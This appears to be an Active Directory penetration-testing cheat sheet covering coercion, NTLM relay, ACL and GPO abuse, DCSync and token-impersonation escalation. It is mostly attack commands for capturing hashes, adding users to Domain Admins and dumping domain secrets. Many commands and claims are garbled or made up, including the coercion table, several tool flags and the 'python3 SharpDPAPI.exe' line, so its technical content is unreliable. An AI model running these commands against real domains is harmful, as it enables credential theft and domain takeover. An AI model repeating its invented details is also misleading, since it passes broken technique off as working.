# Coercion, Relay & ACL Abuse

## Coercion (force a machine to authenticate to you)

Windows authentication can be triggered remotely. If you can make a target machine send an
authentication request to a listener you control, you capture its hash or ticket.

| Protocol | Trigger | Modern Windows |
|---|---|---|
| MS-RPC (Drsuapi) | `netlogon` interface, `NetrServerAuthenticate3` | patched by default (CVE-2020-1472) |
| MS-SMB | `NetrServerAuthenticate3` via RPC | same |
| LDAP (LDAPS/NTLM) | coerce via `NetrServerAuthenticate3` | |
| DCOM | `RemoteActivation` | **not patched** — the modern coercion primitive |
| HTTP (WinRM) | `NetrServerAuthenticate3` | |

### DCOM coercion (the live one)

```bash
# 1. listener
responder -I eth0 -v -w -u -U -P
# or
ntlmrelayx -t ldaps://dc.target.local -I 10.10.10.5 -l /tmp/relay

# 2. coerce the target
crackmapexec --target-ip 10.10.10.5 --target-netbios --local-auth -x smb \
  --generator NetExec --coerce-via 'NetrServerAuthenticate3' -u user -p pass
# newer: --coerce 'WScript.Shell:...'

# 3. capture
ntlmrelayx -t ldaps://dc.target.local --no-smb2support -I 10.10.10.5 -l /tmp/relay
```

### Coercer (ESC8 shadow)

```bash
python3 Coercer.py -u user -p pass -d target.local -dc-ip 10.10.10.5 \
  -t shadow.local -m 'Windows 2022' -f ldaps://dc.target.local
```

Gives you a machine account whose `msDS-AllowedToDelegateTo` points at your listener → constrained
delegation → any user.

## Relay

| Type | Target | Notes |
|---|---|---|
| SMB relay | `SMB` / `HTTP` | needs SMB signing not enforced + no channel binding |
| LDAP relay | `LDAP` / `LDAPS` | needs LDAP signing off |
| WebDAV relay | `HTTP` → `SMB` | classic: RelayX to a WebDAV server, then to a listener that executes |
| Kerberos relay | `HTTP` → `LDAP` | for the CA path (ESC8) |

### Classic SMB→HTTP WebDAV relay

```bash
ntlmrelayx -t http://10.10.10.5/ -l /tmp/relay -f smb2
# then trigger the WebDAV client (Windows uses it for UNC paths)
```

### Checks before relaying

```bash
nmap -p 88,389,445,636,3268,3269 --script ldap-rootdse,smb2-security-mode 10.10.10.5
```

| Control | If off |
|---|---|
| SMB signing | relay to SMB |
| LDAP signing | relay to LDAP |
| Channel binding (CBT) | relay to LDAP/SMB even with signing |
| EPA | blocks NTLM entirely |

Report the **specific control that is off** — that is the finding, not "relay is possible".

## ACL abuse (the quiet path)

Rights on a user or group object:

| Right | Abuse |
|---|---|
| `GenericAll` | change the password, add to groups, write SPN |
| `GenericWrite` | set `userPassword`, `servicePrincipalName`, member of groups |
| `WriteDacl` | grant yourself a permission you did not have |
| `WriteOwner` | take ownership, then grant yourself everything |
| `Self` | manage yourself (add yourself to a group you can manage) |
| `WriteSPN` | Kerberoast the target |
| `AddMember` | add yourself to a privileged group |
| `WriteProperty` (member) | add yourself to `Domain Admins` |
| `WriteProperty` (msDS-AllowedToDelegateTo) | RBCD |
| `WriteProperty` (scriptPath) | GPO / logon script RCE |
| `WriteProperty` (userCertificateTemplates) | AD CS ESC |

```bash
# BloodHound shows these as edges; enumerate manually if you cannot run it
net user <target> /domain
dsacls "CN=<target>,DC=target,DC=local"
```

### Password reset without knowing the password

```bash
net user <target> <newpass> /domain        # needs the right
# or with the pwdLastSet trick
python3 bloody.py -u user -p pass -d target.local -pwn3d target
```

## Group abuse

```bash
net group "Domain Admins" /domain
net group "Domain Admins" <user> /add /domain      # state change - needs an explicit go
net localgroup Administrators /add <user>
```

Nested groups are the usual surprise: a user in a group nested inside Domain Admins is a Domain
Admin. BloodHound resolves the nesting; `net group` shows it locally.

## GPO abuse

```bash
gpocheck.py -u user -p pass -d target.local
```

| Vector | Result |
|---|---|
| `WriteProperty` on a GPO with `scriptPath` | logon script → RCE as the user |
| `WriteDacl` on a GPO | edit it and add a scheduled task |
| `GPO Abuse` (BloodHound edge) | same |
| Computer/User site inheritance | the GPO applies to a wider scope than expected |

## DCSync (the direct one)

Requires `GetChanges` + `GetChangesAll` (or `Replicating Directory Changes` / `Replicating Directory
Changes All`) on the domain object.

```bash
impacket-secretsdump target.local/'user:pass'@dc.target.local -domain-dsid
```

That dumps every domain hash. It is loud and may be out of scope — check with the operator before
running it, and prefer proving the permission over actually dumping.

## Privilege escalation edge cases

| Technique | Requirement |
|---|---|
| Print Spooler (Potato) | `SeImprintImpersonate` / `SeAssignPrimaryTokenPrivilege` |
| NBNS spoofing + Potato | `SeImpersonatePrivilege` |
| GodPotato | `SeImpersonatePrivilege` |
| SweetPotato | token impersonation primitives |
| DCSync | replication rights |
| Shadow credentials | `msDS-KeyCredentialLink` write |
| DCSync via DRSUAPI | the rights above |
| NTDS.dit offline | physical access or a domain admin to create a volume shadow copy |
| Guaranteed Privilege Escalation | a privileged session |

```bash
python3 godpotato.py -u user -p pass -cmd whoami
python3 PetitPotato.py -u user -p pass whoami
python3 SharpDPAPI.exe decrypt
```

## Reporting

```
EDGE:      <which ACL / right / protocol>
TARGET:    <the object or host>
PROOF:     <the command that succeeded>
RESULT:    <the privilege obtained>
PATH:      <how it chains to the next step>
```
